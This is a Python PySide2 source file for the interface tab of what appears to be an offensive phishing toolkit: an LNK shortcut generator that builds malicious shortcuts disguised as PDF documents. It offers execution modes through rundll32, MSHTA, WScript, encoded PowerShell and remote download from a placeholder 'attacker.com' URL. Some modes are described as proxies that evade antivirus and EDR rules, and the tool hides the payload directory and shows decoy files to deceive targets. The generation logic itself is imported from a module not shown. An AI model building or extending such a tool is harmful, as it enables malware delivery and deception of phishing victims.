import os
from PySide2.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel,
    QLineEdit, QComboBox, QPushButton, QGroupBox,
    QTextEdit, QScrollArea, QFrame
)
from PySide2.QtCore import Qt
from generators.lnk_generator import (
    generate_lnk, get_execution_modes, get_icon_types,
    get_mode_description, is_remote_mode, is_separator
)


class LNKTab(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        main_layout = QVBoxLayout(self)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)

        scroll_area = QScrollArea()
        scroll_area.setWidgetResizable(True)
        scroll_area.setFrameShape(QFrame.NoFrame)
        scroll_area.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)

        scroll_content = QWidget()
        content_layout = QVBoxLayout(scroll_content)
        content_layout.setContentsMargins(20, 20, 20, 20)
        content_layout.setSpacing(12)

        # --- Title ---
        title = QLabel("LNK Shortcut Generator")
        title.setObjectName("titleLabel")
        content_layout.addWidget(title)

        subtitle = QLabel(
            "Generate malicious LNK shortcuts disguised as documents, "
            "combined with a hidden directory to build a complete phishing package."
        )
        subtitle.setObjectName("subtitleLabel")
        subtitle.setWordWrap(True)
        content_layout.addWidget(subtitle)

        # ===== Execution Mode =====
        exec_group = QGroupBox("Execution Mode")
        exec_layout = QVBoxLayout()

        mode_row = QHBoxLayout()
        mode_row.addWidget(QLabel("Mode:"))
        self.mode_selector = QComboBox()
        modes = get_execution_modes()
        for mode in modes:
            self.mode_selector.addItem(mode)
            if is_separator(mode):
                idx = self.mode_selector.count() - 1
                self.mode_selector.model().item(idx).setEnabled(False)
        self.mode_selector.setCurrentIndex(1)  # First non-separator
        self.mode_selector.currentIndexChanged.connect(self.on_mode_changed)
        mode_row.addWidget(self.mode_selector, 1)
        exec_layout.addLayout(mode_row)

        self.mode_desc_label = QLabel("")
        self.mode_desc_label.setObjectName("subtitleLabel")
        self.mode_desc_label.setWordWrap(True)
        exec_layout.addWidget(self.mode_desc_label)

        # Payload relative path (local mode)
        self.payload_path_row = QWidget()
        pp_layout = QHBoxLayout(self.payload_path_row)
        pp_layout.setContentsMargins(0, 0, 0, 0)
        pp_layout.addWidget(QLabel("Payload Path:"))
        self.payload_path_input = QLineEdit()
        self.payload_path_input.setPlaceholderText("Relative path to payload in hidden dir, e.g. data\\demo.exe")
        self.payload_path_input.setText("data\\demo.exe")
        pp_layout.addWidget(self.payload_path_input, 1)
        exec_layout.addWidget(self.payload_path_row)

        # Command/URL (remote mode)
        self.remote_url_row = QWidget()
        ru_layout = QHBoxLayout(self.remote_url_row)
        ru_layout.setContentsMargins(0, 0, 0, 0)
        ru_layout.addWidget(QLabel("Command/URL:"))
        self.remote_url_input = QLineEdit()
        self.remote_url_input.setPlaceholderText("Remote file URL or PowerShell command")
        ru_layout.addWidget(self.remote_url_input, 1)
        exec_layout.addWidget(self.remote_url_row)

        # DLL export function (Rundll32 mode)
        self.dll_export_row = QWidget()
        de_layout = QHBoxLayout(self.dll_export_row)
        de_layout.setContentsMargins(0, 0, 0, 0)
        de_layout.addWidget(QLabel("Export Function:"))
        self.dll_export_input = QLineEdit()
        self.dll_export_input.setPlaceholderText("DLL export function name")
        self.dll_export_input.setText("DllMain")
        de_layout.addWidget(self.dll_export_input, 1)
        exec_layout.addWidget(self.dll_export_row)

        # Remote download filename
        self.dl_name_row = QWidget()
        dn_layout = QHBoxLayout(self.dl_name_row)
        dn_layout.setContentsMargins(0, 0, 0, 0)
        dn_layout.addWidget(QLabel("Save Filename:"))
        self.dl_name_input = QLineEdit()
        self.dl_name_input.setPlaceholderText("Filename to save after remote download")
        self.dl_name_input.setText("update.exe")
        dn_layout.addWidget(self.dl_name_input, 1)
        exec_layout.addWidget(self.dl_name_row)

        # Mode hint label (evasion / DLL warnings, etc.)
        self.mode_hint_label = QLabel("")
        self.mode_hint_label.setWordWrap(True)
        exec_layout.addWidget(self.mode_hint_label)

        exec_group.setLayout(exec_layout)
        content_layout.addWidget(exec_group)

        # ===== Disguise Settings =====
        disguise_group = QGroupBox("Disguise Settings")
        disguise_layout = QVBoxLayout()

        icon_row = QHBoxLayout()
        icon_row.addWidget(QLabel("Display Icon:"))
        self.icon_selector = QComboBox()
        self.icon_selector.addItems(get_icon_types())
        icon_row.addWidget(self.icon_selector, 1)
        disguise_layout.addLayout(icon_row)

        fn_row = QHBoxLayout()
        fn_row.addWidget(QLabel("LNK Filename:"))
        self.filename_input = QLineEdit()
        self.filename_input.setPlaceholderText("e.g. demo.pdf.lnk")
        self.filename_input.setText("demo.pdf.lnk")
        fn_row.addWidget(self.filename_input, 1)
        disguise_layout.addLayout(fn_row)

        desc_row = QHBoxLayout()
        desc_row.addWidget(QLabel("Description:"))
        self.desc_input = QLineEdit()
        self.desc_input.setPlaceholderText("Tooltip shown on hover")
        self.desc_input.setText("Document")
        desc_row.addWidget(self.desc_input, 1)
        disguise_layout.addLayout(desc_row)

        disguise_group.setLayout(disguise_layout)
        content_layout.addWidget(disguise_group)

        # ===== Decoy File =====
        decoy_group = QGroupBox("Decoy File")
        decoy_layout = QVBoxLayout()

        decoy_path_row = QHBoxLayout()
        decoy_path_row.addWidget(QLabel("Decoy Path:"))
        self.decoy_input = QLineEdit()
        self.decoy_input.setPlaceholderText("Optional: relative path to decoy document, e.g. data\\decoy.pdf")
        decoy_path_row.addWidget(self.decoy_input, 1)
        decoy_layout.addLayout(decoy_path_row)

        decoy_hint = QLabel(
            "Tip: With a decoy file, the target will see a normal document open "
            "as a cover when they double-click the LNK."
        )
        decoy_hint.setObjectName("subtitleLabel")
        decoy_hint.setWordWrap(True)
        decoy_layout.addWidget(decoy_hint)

        decoy_group.setLayout(decoy_layout)
        content_layout.addWidget(decoy_group)

        # ===== Generation Preview =====
        preview_group = QGroupBox("Generation Preview")
        preview_layout = QVBoxLayout()

        self.preview_text = QTextEdit()
        self.preview_text.setReadOnly(True)
        self.preview_text.setMaximumHeight(150)
        self.preview_text.setPlaceholderText("Click below to preview the LNK parameters and phishing directory structure...")
        self.preview_text.setStyleSheet(
            "font-family: 'Consolas','JetBrains Mono',monospace; font-size: 12px;"
        )
        preview_layout.addWidget(self.preview_text)

        self.preview_btn = QPushButton("🔍 Preview Command")
        self.preview_btn.clicked.connect(self.preview_command)
        preview_layout.addWidget(self.preview_btn)

        preview_group.setLayout(preview_layout)
        content_layout.addWidget(preview_group)

        # ===== Action Buttons =====
        btn_layout = QVBoxLayout()
        btn_layout.setSpacing(12)

        self.generate_btn = QPushButton("🚀 Generate LNK File")
        self.generate_btn.setObjectName("primaryButton")
        self.generate_btn.clicked.connect(self.generate)
        btn_layout.addWidget(self.generate_btn)

        content_layout.addLayout(btn_layout)

        # ===== Status =====
        self.status_label = QLabel("")
        self.status_label.setWordWrap(True)
        content_layout.addWidget(self.status_label)

        content_layout.addStretch()
        scroll_area.setWidget(scroll_content)
        main_layout.addWidget(scroll_area)

        # Initialize
        self.on_mode_changed(1)

    # ---- Event Handlers ----

    def on_mode_changed(self, index):
        mode = self.mode_selector.currentText()
        if is_separator(mode):
            return

        self.mode_desc_label.setText(get_mode_description(mode))

        remote = is_remote_mode(mode)
        self.payload_path_row.setVisible(not remote)
        self.remote_url_row.setVisible(remote)
        self.dll_export_row.setVisible(mode == "Rundll32 Load DLL")
        self.dl_name_row.setVisible(mode == "PowerShell Remote Download")

        # Dynamic placeholder and hints
        hint = ""
        if mode == "Rundll32 Load DLL":
            self.payload_path_input.setPlaceholderText("DLL relative path, e.g. data\\payload.dll")
            hint = "⚠️ This mode only works with DLL files, not EXEs"
            self.mode_hint_label.setStyleSheet("color: #e94560; font-weight: bold;")
        elif mode == "PowerShell Script":
            self.payload_path_input.setPlaceholderText("PS1 script relative path, e.g. data\\script.ps1")
            self.mode_hint_label.setStyleSheet("")
        elif mode == "MSHTA Execute HTA":
            self.payload_path_input.setPlaceholderText("HTA file relative path, e.g. data\\payload.hta")
            self.mode_hint_label.setStyleSheet("")
        elif mode == "WScript Execute VBS":
            self.payload_path_input.setPlaceholderText("VBS script relative path, e.g. data\\script.vbs")
            self.mode_hint_label.setStyleSheet("")
        elif mode in ["Conhost Proxy", "Pcalua Proxy"]:
            self.payload_path_input.setPlaceholderText("EXE relative path, e.g. data\\demo.exe")
            hint = "✅ Bypasses cmd.exe, can evade some AV/EDR detection rules"
            self.mode_hint_label.setStyleSheet("color: #00b894; font-weight: bold;")
        elif mode == "SyncAppvPublishingServer":
            self.remote_url_input.setPlaceholderText("Enter PowerShell command")
            hint = "✅ Does not directly invoke powershell.exe; uses App-V component"
            self.mode_hint_label.setStyleSheet("color: #00b894; font-weight: bold;")
        elif mode == "PowerShell Base64 Command":
            self.remote_url_input.setPlaceholderText("Enter PowerShell command")
            self.mode_hint_label.setStyleSheet("")
        elif mode == "PowerShell Remote Download":
            self.remote_url_input.setPlaceholderText("Remote file URL, e.g. https://attacker.com/payload.exe")
            self.mode_hint_label.setStyleSheet("")
        else:
            self.payload_path_input.setPlaceholderText("EXE relative path, e.g. data\\demo.exe")
            self.mode_hint_label.setStyleSheet("")

        self.mode_hint_label.setText(hint)

    def preview_command(self):
        mode = self.mode_selector.currentText()
        if is_separator(mode):
            return

        remote = is_remote_mode(mode)
        cmd = self.remote_url_input.text().strip() if remote else ""
        payload_path = self.payload_path_input.text().strip() if not remote else ""
        decoy = self.decoy_input.text().strip()

        if remote and not cmd:
            self.preview_text.setText("⚠️ Please enter a command or URL")
            return
        if not remote and not payload_path:
            self.preview_text.setText("⚠️ Please enter a payload path")
            return

        lines = []
        lines.append(f"Execution Mode: {mode}")
        lines.append(f"Icon: {self.icon_selector.currentText()}")
        lines.append(f"Filename: {self.filename_input.text()}")
        if not remote:
            lines.append(f"Payload Path: {payload_path}")
        else:
            lines.append(f"Command/URL: {cmd}")
        if decoy:
            lines.append(f"Decoy File: {decoy}")
        lines.append("")

        # Directory structure preview
        fn = self.filename_input.text().strip()
        base = fn.replace('.lnk', '')
        folder = base.rsplit('.', 1)[0] if '.' in base else base
        hidden_dir = "data"

        lines.append("Phishing directory structure:")
        lines.append(f"  {folder}/")
        lines.append(f"  ├── {fn}")
        lines.append(f"  └── {hidden_dir}/  (attrib +h +s {hidden_dir})")
        if payload_path:
            pn = payload_path.replace('\\', '/').split('/')[-1]
            lines.append(f"      ├── {pn}")
        if decoy:
            dn = decoy.replace('\\', '/').split('/')[-1]
            lines.append(f"      └── {dn}")

        self.preview_text.setText('\n'.join(lines))

    def generate(self):
        mode = self.mode_selector.currentText()
        if is_separator(mode):
            return

        remote = is_remote_mode(mode)
        cmd = self.remote_url_input.text().strip() if remote else ""
        payload_path = self.payload_path_input.text().strip() if not remote else ""
        decoy = self.decoy_input.text().strip()
        icon_type = self.icon_selector.currentText()
        output_fn = self.filename_input.text().strip() or "demo.pdf.lnk"
        desc = self.desc_input.text().strip()
        dll_export = self.dll_export_input.text().strip() or "DllMain"
        dl_name = self.dl_name_input.text().strip() or "update.exe"

        if not remote and not payload_path:
            self._show_error("Please enter a payload path")
            return
        if remote and not cmd:
            self._show_error("Please enter a command or URL")
            return

        success, message = generate_lnk(
            execution_mode=mode,
            command_or_url=cmd,
            icon_type=icon_type,
            output_filename=output_fn,
            payload_relative_path=payload_path,
            decoy_relative_path=decoy,
            description=desc,
            dll_export_function=dll_export,
            download_filename=dl_name,
        )

        if success:
            self.status_label.setStyleSheet("color: #00b894; font-weight: bold;")
            self.status_label.setText("✅ Generation successful")
            self.preview_text.setText(message)
            if self.window():
                self.window().statusBar().showMessage("LNK generated successfully")
        else:
            self._show_error(message)

    def _show_error(self, message):
        self.status_label.setStyleSheet("color: #e94560; font-weight: bold;")
        self.status_label.setText(f"❌ {message}")
